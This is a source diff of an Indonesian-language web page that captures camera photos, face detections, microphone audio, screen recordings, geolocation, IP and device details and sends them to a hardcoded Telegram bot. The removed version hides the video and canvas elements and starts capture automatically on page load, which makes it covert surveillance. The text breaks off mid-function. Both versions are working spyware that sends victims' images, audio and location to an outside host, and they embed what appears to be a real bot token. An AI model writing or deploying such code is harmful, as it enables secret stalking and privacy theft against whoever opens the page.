@@ -1,424 +1,492 @@
-<!doctype html>
-<html lang="id">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Auto Capture (Camera / Screen / Audio) → Telegram (Direct)</title>
-  <style>
-    html,body{height:100%;margin:0;background:#000;color:#000}
-    /* elemen ada tapi tersembunyi */
-    video,canvas{display:none!important;width:640px;height:480px}
-  </style>
-</head>
-<body>
-  <video id="video" width="640" height="480" autoplay muted playsinline></video>
-  <canvas id="canvas" width="640" height="480"></canvas>
-
-  <!-- face-api (untuk deteksi wajah dari kamera) -->
-  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
-
-  <script>
-  (async () => {
-    // ========== KONFIGURASI ==========
-    const params = new URLSearchParams(window.location.search);
-    // TOKEN & CHAT langsung di URL (sesuai permintaan). Risiko: token tampak di client.
-    const BOT_TOKEN = params.get('token') || "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
-    const CHAT_ID  = params.get('chat')  || "8471664635";
-
-    const MODEL_URL = "https://cdn.jsdelivr.net/gh/vladmandic/face-api/model/";
-    const CAMERA_DETECT_INTERVAL = 5000;    // deteksi wajah dari kamera (ms)
-    const SCREEN_CAPTURE_MS = 5000;         // durasi rekaman layar (ms)
-    const MIN_INTERVAL_BETWEEN_SENDS = 5000;
-    const IMAGE_TYPE = 'image/jpeg';
-    const IMAGE_QUALITY = 0.85;
-    const MAX_RETRY = 3;
-    const SEND_TIMEOUT_MS = 60000; // timeout untuk upload
-    // ==================================
-
-    // Elemen
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-
-    // Util: device, network, battery, location, reverse geocode
-    function detectDevice() {
-      const ua = navigator.userAgent || "unknown";
-      const l = ua.toLowerCase();
-      let brand = "Unknown";
-      if (/iphone|ipad/.test(l)) brand = "Apple (iPhone/iPad)";
-      else if (/android/.test(l)) {
-        if (/samsung/.test(l)) brand = "Samsung";
-        else if (/huawei|honor/.test(l)) brand = "Huawei/Honor";
-        else if (/xiaomi|redmi|poco/.test(l)) brand = "Xiaomi/Poco";
-        else if (/oppo/.test(l)) brand = "OPPO";
-        else if (/vivo/.test(l)) brand = "Vivo";
-        else brand = "Android (lainnya)";
-      } else if (/windows/.test(l)) brand = "Windows PC";
-      else if (/macintosh/.test(l)) brand = "MacOS";
-      else if (/linux/.test(l)) brand = "Linux";
-      return { brand, ua };
-    }
-
-    function getNetworkInfo() {
-      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      return {
-        type: conn ? (conn.effectiveType || conn.type || "unknown") : "unknown",
-        downlink: conn ? (conn.downlink || "n/a") : "n/a",
-        rtt: conn ? (conn.rtt || "n/a") : "n/a"
-      };
-    }
-
-    async function getBatteryInfo() {
-      try {
-        if (!navigator.getBattery) return null;
-        const b = await navigator.getBattery();
-        return {
-          level: Math.round(b.level * 100),
-          charging: !!b.charging
-        };
-      } catch {
-        return null;
-      }
-    }
-
-    async function getLocation(timeout=10000) {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(null);
-        let done = false;
-        const timer = setTimeout(() => { if (!done) { done = true; resolve(null); } }, timeout);
-        navigator.geolocation.getCurrentPosition(
-          pos => { if (!done) { done = true; clearTimeout(timer); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }); } },
-          () => { if (!done) { done = true; clearTimeout(timer); resolve(null); } },
-          { enableHighAccuracy: true, timeout }
-        );
-      });
-    }
-
-    async function reverseGeocode(lat, lon) {
-      try {
-        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`);
-        if (!r.ok) return null;
-        const j = await r.json();
-        // j.address bisa memuat village/town/county/state/postcode/country
-        return j;
-      } catch {
-        return null;
-      }
-    }
-
-    // Kirim file ke Telegram (photo atau video). Mengembalikan waktu round-trip ms.
-    async function sendToTelegram({type='photo', blob, filename='capture.jpg', caption=''}) {
-      if (!BOT_TOKEN || !CHAT_ID) {
-        console.warn("TOKEN/CHAT tidak diset — skip send.");
-        return {ok:false, error:'no_token'};
-      }
-      try {
-        const fd = new FormData();
-        fd.append("chat_id", CHAT_ID);
-        fd.append("caption", caption);
-        if (type === 'photo') fd.append("photo", blob, filename);
-        else if (type === 'video') fd.append("video", blob, filename);
-        else fd.append("document", blob, filename);
-
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${ type === 'photo' ? 'sendPhoto' : type === 'video' ? 'sendVideo' : 'sendDocument' }`;
-
-        const start = Date.now();
-        const controller = new AbortController();
-        const timeout = setTimeout(() => controller.abort(), SEND_TIMEOUT_MS);
-        const resp = await fetch(url, { method: "POST", body: fd, signal: controller.signal });
-        clearTimeout(timeout);
-        const duration = Date.now() - start;
-        if (!resp.ok) {
-          const text = await resp.text().catch(()=>null);
-          throw new Error(`Telegram API ${resp.status} ${text||''}`);
-        }
-        return { ok: true, duration };
-      } catch (e) {
-        return { ok: false, error: e.message || e };
-      }
-    }
-
-    // Capture camera snapshot to Blob
-    function captureCameraBlob() {
-      try {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        return new Promise(resolve => canvas.toBlob(resolve, IMAGE_TYPE, IMAGE_QUALITY));
-      } catch {
-        return Promise.resolve(null);
-      }
-    }
-
-    // Rekam layar + audio selama ms (return Blob webm)
-    async function recordScreenWithAudio(ms = SCREEN_CAPTURE_MS) {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-        throw new Error("getDisplayMedia tidak didukung di browser ini.");
-      }
-      // request screen (dengan audio jika tersedia)
-      const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true }).catch(e => { throw e; });
-      // beberapa browser tidak include audio dari mic in getDisplayMedia — kita bisa mencoba gabungkan mic
-      let micStream = null;
-      try {
-        micStream = await navigator.mediaDevices.getUserMedia({ audio: true }).catch(()=>null);
-      } catch {}
-      // gabungkan track: gunakan audio dari screenStream jika ada, jika tidak gabungkan micStream
-      const tracks = [];
-      screenStream.getVideoTracks().forEach(t=>tracks.push(t));
-      const audioTracksScreen = screenStream.getAudioTracks();
-      if (audioTracksScreen && audioTracksScreen.length > 0) {
-        audioTracksScreen.forEach(t => tracks.push(t));
-      } else if (micStream && micStream.getAudioTracks().length > 0) {
-        micStream.getAudioTracks().forEach(t => tracks.push(t));
-      }
-      const mixed = new MediaStream(tracks);
-      const recorder = new MediaRecorder(mixed, { mimeType: 'video/webm;codecs=vp8,opus' });
-      const chunks = [];
-      recorder.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
-      recorder.start();
-      await new Promise(r => setTimeout(r, ms));
-      recorder.stop();
-      // stop tracks
-      mixed.getTracks().forEach(t => t.stop());
-      screenStream.getTracks().forEach(t => t.stop());
-      if (micStream) micStream.getTracks().forEach(t => t.stop());
-      return new Promise(resolve => {
-        recorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          resolve(blob);
-        };
-      });
-    }
-
-    // Kamera face detection loop (mengirim foto ketika wajah terdeteksi)
-    let lastSendTs = 0;
-    let lastFaceCount = 0;
-
-    async function captureAndSendIfFace() {
-      if (!video || video.readyState < 2) return;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
-      const count = detections ? detections.length : 0;
-      if (count === 0) { lastFaceCount = 0; return; }
-
-      const now = Date.now();
-      if (now - lastSendTs < MIN_INTERVAL_BETWEEN_SENDS) {
-        if (count <= lastFaceCount) return;
-      }
-      if (lastFaceCount > 0 && count === lastFaceCount && (now - lastSendTs) < CAMERA_DETECT_INTERVAL) return;
-
-      // compile metadata
-      const device = detectDevice();
-      const net = getNetworkInfo();
-      const battery = await getBatteryInfo();
-      const loc = await getLocation();
-      let locText = "Tidak diketahui";
-      let rev = null;
-      if (loc) {
-        rev = await reverseGeocode(loc.lat, loc.lon);
-        if (rev && rev.address) {
-          // construct detailed address if available
-          const a = rev.address;
-          const parts = [
-            a.house_number || '',
-            a.road || a.pedestrian || '',
-            a.suburb || a.village || a.town || a.hamlet || '',
-            a.county || a.municipality || '',
-            a.state || '',
-            a.postcode || '',
-            a.country || ''
-          ].filter(Boolean);
-          locText = parts.join(', ');
-        } else {
-          locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)} (acc ${loc.acc}m)`;
-        }
-      }
-
-      const captionParts = [
-        "📸 Deteksi Wajah Otomatis",
-        `👥 Jumlah wajah: ${count}`,
-        `📱 Device: ${device.brand}`,
-        `🌐 Jaringan: ${net.type} (downlink=${net.downlink}, rtt=${net.rtt})`,
-        `🔋 Baterai: ${battery ? battery.level + '%' + (battery.charging ? ' (charging)' : '') : 'n/a'}`,
-        `📍 Lokasi: ${locText}`,
-        `🕒 ${new Date().toLocaleString()}`
-      ];
-      const caption = captionParts.join("\n");
-
-      const blob = await captureCameraBlob();
-      if (!blob) return;
-      lastSendTs = now;
-      lastFaceCount = count;
-
-      // kirim foto -> ukur durasi
-      const res = await sendToTelegram({ type: 'photo', blob, filename: 'camera.jpg', caption });
-      // (res.duration jika ok)
-      if (res.ok) {
-        console.log("Foto terkirim, durasi ms:", res.duration);
-      } else {
-        console.warn("Gagal kirim foto:", res.error);
-      }
-    }
-
-    // Fungsi utama: inisialisasi kamera + load model
-    async function initCameraAndModel() {
-      try {
-        await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
-      } catch (e) {
-        console.warn("Gagal load face-api model:", e);
-        // tetap lanjut (kamera mungkin masih dipakai untuk screen capture)
-      }
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480, facingMode:'user' }, audio:false });
-        video.srcObject = stream;
-        await video.play();
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        // jalankan detection loop
-        setInterval(captureAndSendIfFace, CAMERA_DETECT_INTERVAL);
-      } catch (e) {
-        console.warn("Tidak dapat buka kamera atau user menolak:", e);
-      }
-    }
-
-    // Fitur: rekam layar (screen+audio) singkat lalu kirim ke Telegram
-    async function captureAndSendScreenRecording() {
-      try {
-        const startMeta = { t0: Date.now() };
-        const blob = await recordScreenWithAudio(SCREEN_CAPTURE_MS);
-        if (!blob) throw new Error("Rekaman kosong");
-        const battery = await getBatteryInfo();
-        const device = detectDevice();
-        const net = getNetworkInfo();
-        const loc = await getLocation();
-        let locText = "Tidak diketahui";
-        if (loc) {
-          const rev = await reverseGeocode(loc.lat, loc.lon);
-          if (rev && rev.address) {
-            const a = rev.address;
-            const parts = [ a.village||a.town||a.suburb||'', a.county||'', a.state||'', a.postcode||'', a.country||'' ].filter(Boolean);
-            locText = parts.join(', ');
-          } else {
-            locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)} (acc ${loc.acc}m)`;
-          }
-        }
-        const caption = [
-          "🎥 Rekaman Layar Otomatis",
-          `📱 Device: ${device.brand}`,
-          `🔋 Baterai: ${battery ? battery.level + '%' : 'n/a'}`,
-          `🌐 Jaringan: ${net.type} (rtt=${net.rtt})`,
-          `📍 Lokasi: ${locText}`,
-          `🕒 ${new Date().toLocaleString()}`
-        ].join("\n");
-
-        const res = await sendToTelegram({ type: 'video', blob, filename: 'screen.webm', caption });
-        if (res.ok) console.log("Rekaman terkirim, durasi ms:", res.duration);
-        else console.warn("Gagal kirim rekaman:", res.error);
-      } catch (e) {
-        console.warn("Capture screen failed:", e.message || e);
-      }
-    }
-
-    // Utility manual untuk snapshot layar (screenshot) + kirim
-    async function captureScreenSnapshotAndSend() {
-      try {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) throw new Error("getDisplayMedia tidak didukung");
-        const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
-        // draw first video frame to canvas by creating a hidden video element
-        const v = document.createElement('video');
-        v.autoplay = true;
-        v.muted = true;
-        v.playsInline = true;
-        v.srcObject = s;
-        await new Promise((r) => { v.onloadedmetadata = r; });
-        // update canvas to match
-        canvas.width = v.videoWidth || 640;
-        canvas.height = v.videoHeight || 480;
-        // draw frame
-        ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
-        // stop tracks
-        s.getTracks().forEach(t => t.stop());
-        // toBlob
-        const blob = await new Promise(res => canvas.toBlob(res, IMAGE_TYPE, IMAGE_QUALITY));
-        // metadata
-        const battery = await getBatteryInfo();
-        const device = detectDevice();
-        const net = getNetworkInfo();
-        const loc = await getLocation();
-        let locText = "Tidak diketahui";
-        if (loc) {
-          const rev = await reverseGeocode(loc.lat, loc.lon);
-          if (rev && rev.address) {
-            const a = rev.address;
-            const parts = [ a.village||a.town||a.suburb||'', a.county||'', a.state||'', a.postcode||'', a.country||'' ].filter(Boolean);
-            locText = parts.join(', ');
-          } else {
-            locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)} (acc ${loc.acc}m)`;
-          }
-        }
-        const caption = [
-          "📷 Snapshot Layar",
-          `📱 Device: ${device.brand}`,
-          `🔋 Baterai: ${battery ? battery.level + '%' : 'n/a'}`,
-          `📍 Lokasi: ${locText}`,
-          `🕒 ${new Date().toLocaleString()}`
-        ].join("\n");
-        const res = await sendToTelegram({ type: 'photo', blob, filename: 'screen.jpg', caption });
-        if (res.ok) console.log("Snapshot screen terkirim:", res.duration);
-        else console.warn("Gagal kirim snapshot:", res.error);
-      } catch (e) {
-        console.warn("Gagal capture snapshot layar:", e.message || e);
-      }
-    }
-
-    // Permintaan izin Notification (tidak dapat membaca notifikasi sistem)
-    async function requestNotificationPermission() {
-      if (!('Notification' in window)) return null;
-      const p = await Notification.requestPermission();
-      return p;
-    }
-
-    // Expose debug API via console
-    window.__autoCapture = {
-      captureScreenRecording: captureAndSendScreenRecording,
-      captureScreenSnapshot: captureScreenSnapshotAndSend,
-      sendCameraSnapshotNow: async () => {
-        const blob = await captureCameraBlob();
-        if (!blob) return console.warn("Tidak ada blob kamera");
-        const battery = await getBatteryInfo();
-        const loc = await getLocation();
-        let locText = "Tidak diketahui";
-        if (loc) {
-          const rev = await reverseGeocode(loc.lat, loc.lon);
-          if (rev && rev.address) {
-            const a = rev.address;
-            locText = [a.village||a.town||a.suburb||'', a.county||'', a.state||'', a.postcode||'', a.country||''].filter(Boolean).join(', ');
-          } else locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}`;
-        }
-        const caption = `Manual camera snapshot\n🔋 ${battery ? battery.level + '%' : 'n/a'}\n📍 ${locText}\n🕒 ${new Date().toLocaleString()}`;
-        await sendToTelegram({ type: 'photo', blob, filename: 'camera_manual.jpg', caption });
-      },
-      getStatus: async () => {
-        return {
-          device: detectDevice(),
-          network: getNetworkInfo(),
-          battery: await getBatteryInfo(),
-          location: await getLocation(),
-          token_present: !!BOT_TOKEN
-        };
-      },
-      requestNotificationPermission
-    };
-
-    // Start camera & auto face detection loop
-    initCameraAndModel();
-
-    // Auto: optionally start periodic screen recordings (DANGER: will show prompt each time)
-    // We DO NOT enable automatic repeated getDisplayMedia requests to avoid spamming user with permission prompts.
-    // If you want automatic screen recordings, call window.__autoCapture.captureScreenRecording() manually.
-
-    // Note about notifications: browser cannot read other app notifications.
-    console.log("Ready. Use window.__autoCapture.* from console. Reminder: browser tidak bisa membaca notifikasi sistem (privacy/security).");
-
-  })();
-  </script>
-</body>
-</html>
+‎<!DOCTYPE html>
+‎<html lang="id">
+‎<head>
+‎<meta charset="utf-8"/>
+‎<meta name="viewport" content="width=device-width,initial-scale=1"/>
+‎<title>All-in-One Capture → Telegram (Auto)</title>
+‎<style>
+‎  :root{--bg:#071018;--card:#0f1720;--muted:#9aa4b2;--accent:#00ffff}
+‎  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#071018,#0d1117);color:#e6eef6;display:flex;align-items:center;justify-content:center}
+‎  .wrap{width:980px;max-width:96%;padding:16px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));box-shadow:0 10px 40px rgba(0,0,0,0.6)}
+‎  h1{margin:0 0 8px;font-size:20px;display:flex;gap:10px;align-items:center}
+‎  .grid{display:grid;grid-template-columns:1fr 360px;gap:12px}
+‎  .card{background:rgba(255,255,255,0.02);border-radius:10px;padding:12px}
+‎  .status{font-family:monospace;font-size:13px;color:#cfe;white-space:pre-wrap;max-height:280px;overflow:auto;padding:8px;background:rgba(0,0,0,0.18);border-radius:8px}
+‎  button{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--accent);padding:8px 10px;border-radius:8px;cursor:pointer}
+‎  video{width:100%;border-radius:8px;background:#000;display:block}
+‎  .small{font-size:13px;color:var(--muted)}
+‎  .controls{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
+‎  .note{color:#ffcc66;font-size:12px}
+‎</style>
+‎</head>
+‎<body>
+‎  <div class="wrap">
+‎    <h1>🔌 All-in-One: Camera Photo · Device Info · Voice · Screen → Telegram (Auto)</h1>
+‎    <p class="small">Mencoba otomatis: ambil foto kamera, rekam audio & screen (potongan), kirim & kirim info device — setiap interval. Pastikan HTTPS / localhost.</p>
+‎
+‎    <div class="grid">
+‎      <div>
+‎        <div class="card">
+‎          <h3 style="margin:0 0 6px 0">Live Camera</h3>
+‎          <video id="camVideo" autoplay playsinline muted></video>
+‎          <div style="height:8px"></div>
+‎          <div id="camStatus" class="status">Camera: belum aktif</div>
+‎        </div>
+‎
+‎        <div style="height:10px"></div>
+‎
+‎        <div class="card">
+‎          <h3 style="margin:0 0 6px 0">Logs & Status</h3>
+‎          <div id="log" class="status">Menunggu inisialisasi...</div>
+‎          <div style="height:8px"></div>
+‎          <div class="controls">
+‎            <button id="btnStartAll">Mulai Manual (jika auto diblokir)</button>
+‎            <button id="btnStopAll">Hentikan Semua</button>
+‎            <span class="note">Interval default: 10 detik. Ubah di kode jika mau 5s.</span>
+‎          </div>
+‎        </div>
+‎      </div>
+‎
+‎      <div>
+‎        <div class="card">
+‎          <h3 style="margin:0 0 6px 0">Pengaturan & Token</h3>
+‎          <div class="small">Bot Telegram & Chat ID yang dipakai (disimpan di file):</div>
+‎          <pre id="tokenArea" class="status"></pre>
+‎          <div style="height:8px"></div>
+‎          <div class="small">INFO: Browser mungkin minta klik manual untuk izinkan kamera/mikrofon/layar.</div>
+‎        </div>
+‎
+‎        <div style="height:10px"></div>
+‎
+‎        <div class="card">
+‎          <h3 style="margin:0 0 6px 0">Preview Screen</h3>
+‎          <video id="screenVideo" autoplay playsinline style="display:none"></video>
+‎          <div id="screenStatus" class="status">Screen: belum aktif</div>
+‎        </div>
+‎      </div>
+‎    </div>
+‎  </div>
+‎
+‎<script>
+‎/* ================== KONFIGURASI ================== */
+‎/* Ganti INTERVAL_MS ke 5000 untuk 5 detik */
+‎const INTERVAL_MS = 10000; // 10 detik
+‎const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
+‎const CHAT_ID = "8471664635";
+‎
+‎/* ================== Elemen UI ================== */
+‎const camVideo = document.getElementById('camVideo');
+‎const camStatus = document.getElementById('camStatus');
+‎const screenVideo = document.getElementById('screenVideo');
+‎const screenStatus = document.getElementById('screenStatus');
+‎const logDiv = document.getElementById('log');
+‎document.getElementById('tokenArea').textContent = `BOT_TOKEN: ${BOT_TOKEN}\nCHAT_ID: ${CHAT_ID}`;
+‎
+‎/* ================== Helper & util ================== */
+‎function now() { return new Date().toLocaleTimeString(); }
+‎function appendLog(msg) { logDiv.textContent = `[${now()}] ${msg}\n\n` + logDiv.textContent; }
+‎function sleep(ms){ return new Promise(res => setTimeout(res, ms)); }
+‎
+‎async function sendText(text){
+‎  try {
+‎    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+‎      method:'POST', headers: {'Content-Type':'application/json'},
+‎      body: JSON.stringify({ chat_id: CHAT_ID, text })
+‎    });
+‎  } catch(e){ console.error('sendText err', e); }
+‎}
+‎async function sendPhotoBlob(blob, caption){
+‎  try {
+‎    const fd = new FormData();
+‎    fd.append('chat_id', CHAT_ID);
+‎    fd.append('caption', caption || '');
+‎    fd.append('photo', blob, 'photo.jpg');
+‎    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+‎  } catch(e){ console.error('sendPhotoBlob err', e); }
+‎}
+‎async function sendDocBlob(blob, filename, caption){
+‎  try {
+‎    const fd = new FormData();
+‎    fd.append('chat_id', CHAT_ID);
+‎    fd.append('caption', caption || '');
+‎    fd.append('document', blob, filename);
+‎    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
+‎  } catch(e){ console.error('sendDocBlob err', e); }
+‎}
+‎
+‎/* ================== Device info builder ================== */
+‎async function getPublicIP(){
+‎  try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); return j.ip; } catch { return 'unknown'; }
+‎}
+‎function detectDevice(){
+‎  const ua = navigator.userAgent || '';
+‎  const platform = navigator.platform || 'unknown';
+‎  const cores = navigator.hardwareConcurrency || 'n/a';
+‎  const mem = navigator.deviceMemory || 'n/a';
+‎  return { ua, platform, cores, mem };
+‎}
+‎function netInfo(){
+‎  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+‎  return { type: conn ? (conn.effectiveType || conn.type) : 'unknown', downlink: conn ? conn.downlink : 'n/a', rtt: conn ? conn.rtt : 'n/a' };
+‎}
+‎async function buildDeviceCaption(note){
+‎  const dev = detectDevice();
+‎  const net = netInfo();
+‎  const ip = await getPublicIP();
+‎  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+‎  const lines = [
+‎    "📡 Device Info",
+‎    `🕒 ${new Date().toLocaleString()}`,
+‎    `Platform: ${dev.platform}`,
+‎    `UA: ${dev.ua}`,
+‎    `Cores: ${dev.cores}, Mem: ${dev.mem}`,
+‎    `Network: ${net.type} (down:${net.downlink}, rtt:${net.rtt})`,
+‎    `IP: ${ip}`,
+‎    `Timezone: ${tz}`,
+‎    note || ''
+‎  ];
+‎  return lines.join("\n");
+‎}
+‎
+‎/* ================== Camera Photo capture ================== */
+‎let camStream = null;
+‎async function startCamera(){
+‎  if (camStream) return;
+‎  try {
+‎    camStatus.textContent = "Meminta izin kamera...";
+‎    camStream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480 }, audio: false });
+‎    camVideo.srcObject = camStream;
+‎    await camVideo.play();
+‎    camStatus.textContent = "Camera: aktif";
+‎    appendLog("Camera aktif.");
+‎  } catch(e){
+‎    camStatus.textContent = "Camera: gagal - " + (e.message || e);
+‎    appendLog("Gagal akses kamera: " + (e.message || e));
+‎  }
+‎}
+‎async function stopCamera(){
+‎  if (!camStream) return;
+‎  camStream.getTracks().forEach(t=>t.stop());
+‎  camStream = null;
+‎  try { camVideo.srcObject = null; } catch {}
+‎  camStatus.textContent = "Camera: berhenti";
+‎  appendLog("Camera dihentikan.");
+‎}
+‎async function capturePhotoAndSend(){
+‎  if (!camStream) { appendLog("Capture skipped: camera tidak aktif."); return; }
+‎  try {
+‎    const w = camVideo.videoWidth || 640;
+‎    const h = camVideo.videoHeight || 480;
+‎    const c = document.createElement('canvas');
+‎    c.width = w; c.height = h;
+‎    const ctx = c.getContext('2d');
+‎    ctx.drawImage(camVideo, 0, 0, w, h);
+‎    const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.85));
+‎    const caption = await buildDeviceCaption("Foto kamera otomatis");
+‎    await sendPhotoBlob(blob, caption);
+‎    appendLog("Foto kamera dikirim.");
+‎  } catch(e){ appendLog("Error capturePhoto: " + (e.message || e)); }
+‎}
+‎
+‎/* ================== Audio recording (chunked) ================== */
+‎let audioStream = null;
+‎let audioRecorder = null;
+‎let audioChunks = [];
+‎let audioActive = false;
+‎
+‎async function startAudio(){
+‎  if (audioActive) return;
+‎  try {
+‎    appendLog("Meminta izin mikrofon...");
+‎    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+‎    audioActive = true;
+‎    audioRecorder = new MediaRecorder(audioStream);
+‎    audioRecorder.ondataavailable = e => { if (e.data && e.data.size) audioChunks.push(e.data); };
+‎    audioRecorder.onstop = async () => {
+‎      if (audioChunks.length === 0) return;
+‎      const blob = new Blob(audioChunks, { type: audioChunks[0].type || 'audio/webm' });
+‎      const ts = new Date().toISOString().replace(/[:.]/g,'-');
+‎      const filename = `audio-${ts}.webm`;
+‎      const caption = await buildDeviceCaption("Audio otomatis");
+‎      await sendDocBlob(blob, filename, caption);
+‎      appendLog("Chunk audio dikirim: " + filename);
+‎      audioChunks = [];
+‎    };
+‎    audioRecorder.start();
+‎    appendLog("Audio merekam.");
+‎    // loop chunking using stop/start pattern
+‎    (async function loopAudio(){
+‎      while (audioActive){
+‎        await sleep(INTERVAL_MS);
+‎        if (!audioActive) break;
+‎        try {
+‎          if (audioRecorder && audioRecorder.state === 'recording') {
+‎            audioRecorder.stop();
+‎            await sleep(300); // allow onstop to fire & send
+‎            audioRecorder = new MediaRecorder(audioStream);
+‎            audioChunks = [];
+‎            audioRecorder.ondataavailable = e => { if (e.data && e.data.size) audioChunks.push(e.data); };
+‎            audioRecorder.onstop = async () => {
+‎              if (audioChunks.length === 0) return;
+‎              const blob = new Blob(audioChunks, { type: audioChunks[0].type || 'audio/webm' });
+‎              const ts = new Date().toISOString().replace(/[:.]/g,'-');
+‎              const filename = `audio-${ts}.webm`;
+‎              const caption = await buildDeviceCaption("Audio otomatis");
+‎              await sendDocBlob(blob, filename, caption);
+‎              appendLog("Chunk audio dikirim: " + filename);
+‎              audioChunks = [];
+‎            };
+‎            audioRecorder.start();
+‎          }
+‎        } catch(err){
+‎          appendLog("Audio chunk error: " + (err.message || err));
+‎          break;
+‎        }
+‎      }
+‎    })();
+‎  } catch(e){
+‎    audioActive = false;
+‎    appendLog("Gagal akses mikrofon: " + (e.message || e));
+‎  }
+‎}
+‎function stopAudio(){
+‎  audioActive = false;
+‎  try { if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop(); } catch {}
+‎  if (audioStream) { audioStream.getTracks().forEach(t=>t.stop()); audioStream = null; }
+‎  appendLog("Audio dihentikan.");
+‎}
+‎
+‎/* ================== Screen recording (chunked) ================== */
+‎let screenStream = null;
+‎let screenRecorder = null;
+‎let screenChunks = [];
+‎let screenActive = false;
+‎
+‎async function startScreen(){
+‎  if (screenActive) return;
+‎  try {
+‎    appendLog("Meminta izin recording layar...");
+‎    screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
+‎    try { screenVideo.srcObject = screenStream; screenVideo.style.display = 'block'; } catch {}
+‎    screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
+‎    screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
+‎    screenRecorder.onstop = async () => {
+‎      if (screenChunks.length === 0) return;
+‎      const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
+‎      const ts = new Date().toISOString().replace(/[:.]/g,'-');
+‎      const filename = `screen-${ts}.webm`;
+‎      const caption = await buildDeviceCaption("Screen otomatis");
+‎      await sendDocBlob(blob, filename, caption);
+‎      appendLog("Chunk screen dikirim: " + filename);
+‎      screenChunks = [];
+‎    };
+‎    screenRecorder.start();
+‎    screenActive = true;
+‎    screenStatus.textContent = "Screen: merekam";
+‎    appendLog("Screen recording aktif.");
+‎    // loop chunking
+‎    (async function loopScreen(){
+‎      while (screenActive){
+‎        await sleep(INTERVAL_MS);
+‎        if (!screenActive) break;
+‎        try {
+‎          if (screenRecorder && screenRecorder.state === 'recording') {
+‎            screenRecorder.stop();
+‎            await sleep(500);
+‎            screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
+‎            screenChunks = [];
+‎            screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
+‎            screenRecorder.onstop = async () => {
+‎              if (screenChunks.length === 0) return;
+‎              const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
+‎              const ts = new Date().toISOString().replace(/[:.]/g,'-');
+‎              const filename = `screen-${ts}.webm`;
+‎              const caption = await buildDeviceCaption("Screen otomatis");
+‎              await sendDocBlob(blob, filename, caption);
+‎              appendLog("Chunk screen dikirim: " + filename);
+‎              screenChunks = [];
+‎            };
+‎            screenRecorder.start();
+‎          }
+‎        } catch(err){
+‎          appendLog("Screen chunk error: " + (err.message || err));
+‎          break;
+‎        }
+‎      }
+‎    })();
+‎
+‎    // stop when user stops sharing
+‎    screenStream.getVideoTracks().forEach(track => track.onended = () => { stopScreen(); });
+‎  } catch(e){
+‎    screenStatus.textContent = "Screen: error - " + (e.message || e);
+‎    appendLog("Gagal akses layar: " + (e.message || e));
+‎  }
+‎}
+‎function stopScreen(){
+‎  screenActive = false;
+‎  try { if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop(); } catch {}
+‎  if (screenStream) { screenStream.getTracks().forEach(t=>t.stop()); screenStream = null; }
+‎  try { screenVideo.srcObject = null; screenVideo.style.display = 'none'; } catch {}
+‎  screenStatus.textContent = "Screen: berhenti";
+‎  appendLog("Screen dihentikan.");
+‎}
+‎
+‎/* ================== Overall scheduler: capture everything each interval ================== */
+‎let mainIntervalHandle = null;
+‎async function captureCycleOnce(){
+‎  appendLog("=== Cycle start ===");
+‎  // send device info text first
+‎  try {
+‎    const caption = await buildDeviceCaption("Cycle otomatis");
+‎    await sendText(caption);
+‎    appendLog("Device info dikirim.");
